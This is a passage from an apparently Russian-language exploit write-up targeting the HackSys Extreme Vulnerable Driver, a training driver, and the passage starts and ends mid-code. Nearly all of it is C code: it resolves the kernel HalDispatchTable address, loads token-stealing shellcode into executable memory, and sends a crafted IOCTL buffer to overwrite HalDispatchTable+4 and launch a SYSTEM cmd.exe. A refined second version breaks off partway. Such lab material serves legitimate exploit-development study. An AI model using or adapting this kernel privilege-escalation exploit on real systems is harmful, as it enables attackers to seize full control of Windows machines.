#include</span> <span class="cpf">&lt;tchar.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span>
<span class="cp">#define ARRAY_SIZE 1024
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
    <span class="n">LPVOID</span> <span class="n">drivers</span><span class="p">[</span><span class="n">ARRAY_SIZE</span><span class="p">];</span>
    <span class="n">DWORD</span> <span class="n">cbNeeded</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">cDrivers</span><span class="p">,</span> <span class="n">i</span><span class="p">;</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">EnumDeviceDrivers</span><span class="p">(</span><span class="n">drivers</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">drivers</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">cbNeeded</span><span class="p">)</span> <span class="o">&amp;</span> <span class="n">cbNeeded</span> <span class="o">&lt;</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">drivers</span><span class="p">))</span> <span class="p">{</span>
        <span class="n">TCHAR</span> <span class="n">szDriver</span><span class="p">[</span><span class="n">ARRAY_SIZE</span><span class="p">];</span>

        <span class="n">cDrivers</span> <span class="o">=</span> <span class="n">cbNeeded</span> <span class="o">/</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">drivers</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>

        <span class="n">printf</span><span class="p">(</span><span class="s">"There are %d drivers:</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">cDrivers</span><span class="p">);</span>
        <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">cDrivers</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">GetDeviceDriverBaseName</span><span class="p">(</span><span class="n">drivers</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="n">szDriver</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">szDriver</span><span class="p">)</span> <span class="o">/</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">szDriver</span><span class="p">[</span><span class="mi">0</span><span class="p">])))</span> <span class="p">{</span>
                <span class="c1">//printf(" - %ws - \n", (const WCHAR *)szDriver);</span>
                <span class="c1">//printf("%ls : %ls\n", szDriver, TEXT("ntkrnlpa.exe"));</span>
                <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">wcscmp</span><span class="p">(</span><span class="n">szDriver</span><span class="p">,</span> <span class="n">TEXT</span><span class="p">(</span><span class="s">"ntkrnlpa.exe"</span><span class="p">)))</span> <span class="p">{</span>
                    <span class="n">printf</span><span class="p">(</span><span class="s">"%p: %ls</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">drivers</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="n">szDriver</span><span class="p">);</span>
                <span class="p">}</span>
                <span class="c1">//printf("Skipped!\n");</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">else</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"EnumDeviceDrivers failed; array size needed is %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">cbNeeded</span> <span class="o">/</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">LPVOID</span><span class="p">));</span>
        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p><img src="/assets/post_images/2.png" alt="Handles list" /></p>

<p>Get HalDispatchTable:</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">cDrivers</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">GetDeviceDriverBaseName</span><span class="p">(</span><span class="n">drivers</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="n">szDriver</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">szDriver</span><span class="p">)</span> <span class="o">/</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">szDriver</span><span class="p">[</span><span class="mi">0</span><span class="p">])))</span> <span class="p">{</span>
                <span class="c1">//printf(" - %ws - \n", (const WCHAR *)szDriver);</span>
                <span class="c1">//printf("%ls : %ls\n", szDriver, TEXT("ntkrnlpa.exe"));</span>
                <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">wcscmp</span><span class="p">(</span><span class="n">szDriver</span><span class="p">,</span> <span class="n">TEXT</span><span class="p">(</span><span class="s">"ntkrnlpa.exe"</span><span class="p">)))</span> <span class="p">{</span>
                    <span class="n">printf</span><span class="p">(</span><span class="s">"[+] Kernel Image Base: %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">drivers</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>

                    <span class="n">HMODULE</span> <span class="n">ntkrnlpaHandle</span> <span class="o">=</span> <span class="n">LoadLibraryExW</span><span class="p">(</span><span class="n">szDriver</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
                    <span class="n">PVOID</span> <span class="n">HALUserLand</span> <span class="o">=</span> <span class="p">(</span><span class="n">PVOID</span><span class="p">)</span><span class="n">GetProcAddress</span><span class="p">(</span><span class="n">ntkrnlpaHandle</span><span class="p">,</span> <span class="s">"HalDispatchTable"</span><span class="p">);</span>
                    <span class="n">printf</span><span class="p">(</span><span class="s">"[+] HalDispatchTable userland: %p </span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">HALUserLand</span><span class="p">);</span>
                    <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n\n</span><span class="s">HALUserLand: %p</span><span class="se">\n</span><span class="s">ntkrnlpaHandle: %p</span><span class="se">\n</span><span class="s">drivers[i]: %p</span><span class="se">\n\n</span><span class="s">"</span><span class="p">,</span> <span class="n">HALUserLand</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ntkrnlpaHandle</span><span class="p">,</span> <span class="n">drivers</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
                    <span class="n">PVOID</span> <span class="n">HalDispatchTable</span> <span class="o">=</span> <span class="p">(</span><span class="n">PVOID</span><span class="p">)((</span><span class="n">ULONG</span><span class="p">)</span><span class="n">drivers</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">-</span> <span class="p">(</span><span class="n">ULONG</span><span class="p">)</span><span class="n">ntkrnlpaHandle</span> <span class="o">+</span> <span class="p">(</span><span class="n">ULONG</span><span class="p">)</span><span class="n">HALUserLand</span><span class="p">);</span>
                    <span class="c1">//PVOID HalDispatchTable = HALUserLand – ntkrnlpaHandle + szDriver;</span>

                    <span class="n">printf</span><span class="p">(</span><span class="s">"[~] HalDispatchTable Kernel: %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">HalDispatchTable</span><span class="p">);</span>
                <span class="p">}</span>
                <span class="c1">//printf("Skipped!\n");</span>
            <span class="p">}</span>
        <span class="p">}</span>
</code></pre></div></div>

<p><img src="/assets/post_images/3.png" alt="Handles result" /></p>

<p>Так как переписывать мы будем HalDispatchTable+4, прибавим ещё 4 в коде и напишем эксплойт</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;Windows.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;psapi.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;tchar.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span>
<span class="cp">#define IO_CODE 0x22200B
</span>
<span class="k">const</span> <span class="kt">char</span> <span class="n">kDevName</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"</span><span class="se">\\\\</span><span class="s">.</span><span class="se">\\</span><span class="s">HackSysExtremeVulnerableDriver"</span><span class="p">;</span>

<span class="cp">#define ARRAY_SIZE 1024
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
    <span class="n">__debugbreak</span><span class="p">();</span>
    <span class="n">LPVOID</span> <span class="n">drivers</span><span class="p">[</span><span class="n">ARRAY_SIZE</span><span class="p">];</span>
    <span class="n">DWORD</span> <span class="n">cbNeeded</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">cDrivers</span><span class="p">,</span> <span class="n">i</span><span class="p">;</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">EnumDeviceDrivers</span><span class="p">(</span><span class="n">drivers</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">drivers</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">cbNeeded</span><span class="p">)</span> <span class="o">&amp;</span> <span class="n">cbNeeded</span> <span class="o">&lt;</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">drivers</span><span class="p">))</span> <span class="p">{</span>
        <span class="n">TCHAR</span> <span class="n">szDriver</span><span class="p">[</span><span class="n">ARRAY_SIZE</span><span class="p">];</span>

        <span class="n">cDrivers</span> <span class="o">=</span> <span class="n">cbNeeded</span> <span class="o">/</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">drivers</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>

        <span class="n">printf</span><span class="p">(</span><span class="s">"There are %d drivers:</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">cDrivers</span><span class="p">);</span>
        <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">cDrivers</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">GetDeviceDriverBaseName</span><span class="p">(</span><span class="n">drivers</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="n">szDriver</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">szDriver</span><span class="p">)</span> <span class="o">/</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">szDriver</span><span class="p">[</span><span class="mi">0</span><span class="p">])))</span> <span class="p">{</span>
                <span class="c1">//printf(" - %ws - \n", (const WCHAR *)szDriver);</span>
                <span class="c1">//printf("%ls : %ls\n", szDriver, TEXT("ntkrnlpa.exe"));</span>
                <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">wcscmp</span><span class="p">(</span><span class="n">szDriver</span><span class="p">,</span> <span class="n">TEXT</span><span class="p">(</span><span class="s">"ntkrnlpa.exe"</span><span class="p">)))</span> <span class="p">{</span>
                    <span class="n">printf</span><span class="p">(</span><span class="s">"[+] Kernel Image Base: %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">drivers</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>

                    <span class="n">HMODULE</span> <span class="n">ntkrnlpaHandle</span> <span class="o">=</span> <span class="n">LoadLibraryExW</span><span class="p">(</span><span class="n">szDriver</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
                    <span class="n">PVOID</span> <span class="n">HALUserLand</span> <span class="o">=</span> <span class="p">(</span><span class="n">PVOID</span><span class="p">)</span><span class="n">GetProcAddress</span><span class="p">(</span><span class="n">ntkrnlpaHandle</span><span class="p">,</span> <span class="s">"HalDispatchTable"</span><span class="p">);</span>
                    <span class="n">printf</span><span class="p">(</span><span class="s">"[+] HalDispatchTable userland: %p </span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">HALUserLand</span><span class="p">);</span>
                    <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n\n</span><span class="s">HALUserLand: %p</span><span class="se">\n</span><span class="s">ntkrnlpaHandle: %p</span><span class="se">\n</span><span class="s">drivers[i]: %p</span><span class="se">\n\n</span><span class="s">"</span><span class="p">,</span> <span class="n">HALUserLand</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ntkrnlpaHandle</span><span class="p">,</span> <span class="n">drivers</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
                    <span class="n">PVOID</span> <span class="n">HalDispatchTable</span> <span class="o">=</span> <span class="p">(</span><span class="n">PVOID</span><span class="p">)((</span><span class="n">ULONG</span><span class="p">)</span><span class="n">drivers</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">-</span> <span class="p">(</span><span class="n">ULONG</span><span class="p">)</span><span class="n">ntkrnlpaHandle</span> <span class="o">+</span> <span class="p">(</span><span class="n">ULONG</span><span class="p">)</span><span class="n">HALUserLand</span> <span class="o">+</span> <span class="mi">4</span><span class="p">);</span>
                    <span class="c1">//PVOID HalDispatchTable = HALUserLand – ntkrnlpaHandle + szDriver;</span>

                    <span class="n">printf</span><span class="p">(</span><span class="s">"[~] HalDispatchTable Kernel: %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">HalDispatchTable</span><span class="p">);</span>
                    <span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">shellcode</span> <span class="o">=</span> <span class="s">"</span><span class="se">\x60\x31\xC0\x64\x8B\x80\x24\x01\x00\x00\x8B\x40\x50\x89\xC1\xBA\x04\x00\x00\x00\x8B\x80\xB8\x00\x00\x00\x2D\xB8\x00\x00\x00\x39\x90\xB4\x00\x00\x00\x75\xED\x8B\x90\xF8\x00\x00\x00\x89\x91\xF8\x00\x00\x00\x61\x31\xC0\x5D\xC2\x08\x00</span><span class="s">"</span><span class="p">;</span>
                    <span class="n">LPVOID</span> <span class="n">shellc_ptr</span> <span class="o">=</span> <span class="n">VirtualAlloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">58</span><span class="p">,</span> <span class="n">MEM_RESERVE</span> <span class="o">|</span> <span class="n">MEM_COMMIT</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">);</span>
                    <span class="k">if</span> <span class="p">(</span><span class="n">shellc_ptr</span><span class="p">)</span>
                        <span class="n">memcpy</span><span class="p">(</span><span class="n">shellc_ptr</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">,</span> <span class="mi">58</span><span class="p">);</span>

                    <span class="n">printf</span><span class="p">(</span><span class="s">"[+] Calling CreateFileA() to obtain a handle to driver</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
                    <span class="n">HANDLE</span> <span class="n">hDevice</span> <span class="o">=</span> <span class="n">CreateFileA</span><span class="p">(</span><span class="n">kDevName</span><span class="p">,</span>
                        <span class="n">GENERIC_READ</span> <span class="o">|</span> <span class="n">GENERIC_WRITE</span><span class="p">,</span>
                        <span class="mi">0</span><span class="p">,</span>
                        <span class="nb">NULL</span><span class="p">,</span>
                        <span class="n">OPEN_EXISTING</span><span class="p">,</span>
                        <span class="mi">0</span><span class="p">,</span>
                        <span class="nb">NULL</span>
                    <span class="p">);</span>
                    
                    <span class="k">if</span> <span class="p">(</span><span class="n">hDevice</span> <span class="o">==</span> <span class="n">INVALID_HANDLE_VALUE</span><span class="p">)</span> <span class="p">{</span>
                        <span class="n">printf</span><span class="p">(</span><span class="s">"[-] Error - dailed to get file handle!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
                        <span class="n">system</span><span class="p">(</span><span class="s">"pause"</span><span class="p">);</span>
                        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
                    <span class="p">}</span>
                    <span class="n">printf</span><span class="p">(</span><span class="s">"[+] Successfully obtained a handle to the driver</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>

                    <span class="kt">char</span> <span class="n">poc</span><span class="p">[</span><span class="mi">113</span><span class="p">]</span> <span class="o">=</span> <span class="s">"AAAABBBB222233334444555566667777888899990000zzzzxxxxccccvvvvbbbbnnnnmmmmaaaassssddddffffgggghhhhjjjjkkkkllllpppp"</span><span class="p">;</span>
                    <span class="c1">//printf("%d", sizeof(poc));</span>
                    <span class="n">DWORD</span> <span class="n">bytesRetn</span><span class="p">;</span>

                    <span class="n">LPVOID</span> <span class="o">*</span><span class="n">var1</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">shellc_ptr</span><span class="p">;</span>

                    <span class="n">poc</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">((</span><span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">var1</span><span class="p">)[</span><span class="mi">0</span><span class="p">];</span>
                    <span class="n">poc</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="p">((</span><span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">var1</span><span class="p">)[</span><span class="mi">1</span><span class="p">];</span>
                    <span class="n">poc</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="p">((</span><span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">var1</span><span class="p">)[</span><span class="mi">2</span><span class="p">];</span>
                    <span class="n">poc</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="p">((</span><span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">var1</span><span class="p">)[</span><span class="mi">3</span><span class="p">];</span>

                    <span class="n">poc</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="p">((</span><span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*</span><span class="p">)(</span><span class="o">&amp;</span><span class="n">HalDispatchTable</span><span class="p">))[</span><span class="mi">0</span><span class="p">];</span>
                    <span class="n">poc</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">=</span> <span class="p">((</span><span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*</span><span class="p">)(</span><span class="o">&amp;</span><span class="n">HalDispatchTable</span><span class="p">))[</span><span class="mi">1</span><span class="p">];</span>
                    <span class="n">poc</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span> <span class="o">=</span> <span class="p">((</span><span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*</span><span class="p">)(</span><span class="o">&amp;</span><span class="n">HalDispatchTable</span><span class="p">))[</span><span class="mi">2</span><span class="p">];</span>
                    <span class="n">poc</span><span class="p">[</span><span class="mi">7</span><span class="p">]</span> <span class="o">=</span> <span class="p">((</span><span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*</span><span class="p">)(</span><span class="o">&amp;</span><span class="n">HalDispatchTable</span><span class="p">))[</span><span class="mi">3</span><span class="p">];</span>

                    <span class="c1">//memcpy((void *) &amp;poc[0], HalDispatchTable, 0x4);</span>
                    <span class="c1">//memcpy((void *) &amp;poc[4], &amp;shellc_ptr, 0x4);</span>

                    <span class="n">printf</span><span class="p">(</span><span class="s">"[+] Starting interaction with the driver</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
                    <span class="n">DeviceIoControl</span><span class="p">(</span><span class="n">hDevice</span><span class="p">,</span> <span class="n">IO_CODE</span><span class="p">,</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)</span><span class="n">poc</span><span class="p">,</span> <span class="mi">100</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">bytesRetn</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
                    <span class="n">system</span><span class="p">(</span><span class="s">"cmd.exe"</span><span class="p">);</span>
                    <span class="n">CloseHandle</span><span class="p">(</span><span class="n">hDevice</span><span class="p">);</span>
                <span class="p">}</span>
                <span class="c1">//printf("Skipped!\n");</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">else</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"EnumDeviceDrivers failed; array size needed is %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">cbNeeded</span> <span class="o">/</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">LPVOID</span><span class="p">));</span>
        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Допиливаем напёрстком сплойт, собираем шелл и Viola!</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;Windows.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;psapi.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;tchar.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span>
<span class="cp">#define IO_CODE 0x22200B
</span>
<span class="k">const</span> <span class="kt">char</span> <span class="n">kDevName</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"</span><span class="se">\\\\</span><span class="s">.</span><span class="se">\\</span><span class="s">HackSysExtremeVulnerableDriver"</span><span class="p">;</span>

<span class="cp">#define ARRAY_SIZE 1024
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
    <span class="n">__debugbreak</span><span class="p">();</span>
    <span class="n">LPVOID</span> <span class="n">drivers</span><span class="p">[</span><span class="n">ARRAY_SIZE</span><span class="p">];</span>
    <span class="n">DWORD</span> <span class="n">cbNeeded</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">cDrivers</span><span class="p">,</span> <span class="n">i</span><span class="p">;</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">EnumDeviceDrivers</span><span class="p">(</span><span class="n">drivers</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">drivers</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">cbNeeded</span><span class="p">)</span> <span class="o">&amp;</span> <span class="n">cbNeeded</span> <span class="o">&lt;</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">drivers</span><span class="p">))</span> <span class="p">{</span>
        <span class="n">TCHAR</span> <span class="n">szDriver</span><span class="p">[</span><span class="n">ARRAY_SIZE</span><span class="p">];</span>

        <span class="n">cDrivers</span> <span class="o">=</span> <span class="n">cbNeeded</span> <span class="o">/</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">drivers</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>

        <span class="n">printf</span><span class="p">(</span><span class="s">"There are %d drivers:</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">cDrivers</span><span class="p">);</span>
        <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">cDrivers</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">GetDeviceDriverBaseName</span><span class="p">(</span><span class="n">drivers</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="n">szDriver</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">szDriver</span><span class="p">)</span> <span class="o">/</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">szDriver</span><span class="p">[</span><span class="mi">0</span><span class="p">])))</span> <span class="p">{</span>
                <span class="c1">//printf(" - %ws - \n", (const WCHAR *)szDriver);</span>
                <span class="c1">//printf("%ls : %ls\n", szDriver, TEXT("ntkrnlpa.exe"));</span>
                <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">wcscmp</span><span class="p">(</span><span class="n">szDriver</span><span class="p">,</span> <span class="n">TEXT</span><span class="p">(</span><span class="s">"ntkrnlpa.exe"</span><span class="p">)))</span> <span class="p">{</span>
                    <span class="n">printf</span><span class="p">(</span><span class="s">"[+] Kernel Image Base: %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">drivers</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>

                    <span class="n">HMODULE</span> <span class="n">ntkrnlpaHandle</span> <span class="o">=</span> <span class="n">LoadLibraryExW</span><span class="p">(</span><span class="n">szDriver</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
                    <span class="n">PVOID</span> <span class="n">HALUserLand</span> <span class="o">=</span> <span class="p">(</span><span class="n">PVOID</span><span class="p">)</span><span class="n">GetProcAddress</span><span class="p">(</span><span class="n">ntkrnlpaHandle</span><span class="p">,</span> <span class="s">"HalDispatchTable"</span><span class="p">);</span>
                    <span class="n">printf</span><span class="p">(</span><span class="s">"[+] HalDispatchTable userland: %p </span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">HALUserLand</span><span class="p">);</span>
                    <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n\n</span><span class="s">HALUserLand: %p</span><span class="se">\n</span><span class="s">ntkrnlpaHandle: %p</span><span class="se">\n</span><span class="s">drivers[i]: %p</span><span class="se">\n\n</span><span class="s">"</span><span class="p">,</span> <span class="n">HALUserLand</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ntkrnlpaHandle</span><span class="p">,</span> <span class="n">drivers</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
                    <span class="n">PVOID</span> <span class="n">HalDispatchTable</span> <span class="o">=</span> <span class="p">(</span><span class="n">PVOID</span><span class="p">)((</span><span class="n">ULONG</span><span class="p">)</span><span class="n">drivers</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">-</span> <span class="p">(</span><span class="n">ULONG</span><span class="p">)</span><span class="n">ntkrnlpaHandle</span> <span class="o">+</span> <span class="p">(</span><span class="n">ULONG</span><span class="p">)</span><span class="n">HALUserLand</span> <span class="o">+</span> <span class="mi">4</span><span class="p">);</span>
                    <span class="c1">//PVOID HalDispatchTable = HALUserLand – ntkrnlpaHandle + szDriver;</span>

                    <span class="n">printf</span><span class="p">(</span><span class="s">"[~] HalDispatchTable Kernel: %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">HalDispatchTable</span><span class="p">);</span>
                    <span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">shellcode</span> <span class="o">=</span> <span class="s">"</span><span class="se">\x90\x90\x90\x90\x60\x31\xc0\x64\x8b\x80\x24\x01\x00\x00\x8b\x40\x50\x89\xc1\xba\x04\x00\x00\x00\x8b\x80\xb8\x00\x00\x00\x2d\xb8\x00\x00\x00\x39\x90\xb4\x00\x00\x00\x75\xed\x8b\x90\xf8\x00\x00\x00\x89\x91\xf8\x00\x00\x00\x61\x31\xc0\x83\xc4\x24\x5d\xc2\x08\x00</span><span class="s">"</span><span class="p">;</span>
                    <span class="n">LPVOID</span> <span class="n">shellc_ptr</span> <span class="o">=</span> <span class="n">VirtualAlloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">65</span><span class="p">,</span> <span class="n">MEM_RESERVE</span> <span class="o">|</span> <span class="n">MEM_COMMIT</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">);</span>
                    <span class="k">if</span> <span class="p">(</span><span class="n">shellc_ptr</span><span class="p">)</span>
                        <span class="n">memcpy</span><span class="p">(</span><span class="n">shellc_ptr</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">,</span> <span class="mi">65</span><span class="p">);</span>

                    <span class="n">printf</span><span class="p">(</span><span class="s">"[+] Calling CreateFileA() to obtain a handle to driver</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
                    <span class="n">HANDLE</span> <span class="n">hDevice</span> <span class="o">=</span> <span class="n">CreateFileA</span><span class="p">(</span><span class="n">kDevName</span><span class="p">,</span>
                        <span class="n">GENERIC_READ</span> <span class="o">|</span> <span class="n">GENERIC_WRITE</span><span class="p">,</span>
                        <span class="mi">0</span><span class="p">,</span>
                        <span class="nb">NULL</span><span class="p">,</span>
                        <span class="n">OPEN_EXISTING</span><span class="p">,</span>
                        <span class="mi">0</span><span class="p">,</span>
                        <span class="nb">NULL</span>
                    <span class="p">);</span>
                    
                    <span class="k">if</span> <span class="p">(</span><span class="n">hDevice</span> <span class="o">==</span> <span class="n">INVALID_HANDLE_VALUE</span><span class="p">)</span> <span class="p">{</span>
                        <span class="n">printf</span><span class="p">(</span><span class="s">"[-] Error - dailed to get file handle!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
                        <span class="n">system</span><span class="p">(</span><span class="s">"pause"</span><span class="p">);</span>
                        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
                    <span class="p">}</span>
                    <span class="n">printf</span><span class="p">(</span><span class="s">"[+] Successfully obtained a handle to the driver</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>

                    <span class="kt">char</span> <span class="n">poc</span><span class="p">[</span><span class="mi">113</span><span class="p">]</span> <span class="o">=</span> <span class="s">"AAAABBBB222233334444555566667777888899990000zzzzxxxxccccvvvvbbbbnnnnmmmmaaaassssddddffffgggghhhhjjjjkkkkllllpppp"</span><span class="p">;</span>
